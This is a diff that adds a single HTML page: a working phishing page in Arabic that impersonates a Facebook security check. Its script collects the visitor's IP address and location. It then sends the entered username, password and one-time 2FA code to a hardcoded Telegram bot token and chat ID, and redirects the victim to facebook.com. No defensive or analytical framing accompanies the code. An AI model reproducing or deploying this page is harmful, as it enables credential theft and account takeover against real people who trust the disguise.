@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Security Check</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 100%; max-width: 390px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 36px; font-weight: bold; margin-bottom: 15px; }
+        input { width: 90%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7; }
+        .btn { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 17px; margin-top: 10px; }
+        #otp-box { display: none; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="fb-logo">facebook</div>
+    <div id="login-box">
+        <p>يجب تسجيل الدخول للمتابعة وإتمام التحقق الأمني</p>
+        <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
+        <button class="btn" onclick="captureLogin()">تسجيل الدخول</button>
+    </div>
+    <div id="otp-box">
+        <h3 style="font-size: 18px;">تأكيد رمز الأمان</h3>
+        <p style="font-size: 14px;">أدخل الرمز المكون من 6 أرقام الذي أرسلناه إلى هاتفك.</p>
+        <input type="text" id="otp" placeholder="Code" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+        <button class="btn" onclick="captureOTP()">إرسال الرمز</button>
+    </div>
+</div>
+<script>
+    const BOT_TOKEN = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
+    const CHAT_ID = "1356975454";
+    let uData = "";
+    window.onload = async () => {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        uData = "📍 الموقع: " + d.city + ", " + d.country_name + "\n🌐 IP: " + d.ip;
+    };
+    function captureLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(u && p) {
+            fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent("🎯 صيدة جديدة:\n👤 الحساب: "+u+"\n🔑 الباسورد: "+p+"\n"+uData));
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('otp-box').style.display = 'block';
+        }
+    }
+    function captureOTP() {
+        const o = document.getElementById('otp').value;
+        if(o) {
+            fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent("🔢 كود الـ OTP:\n✅ الكود: "+o));
+            setTimeout(() => { window.location.href = "https://facebook.com"; }, 1000);
+        }
+    }
+</script>
+</body>
+</html>
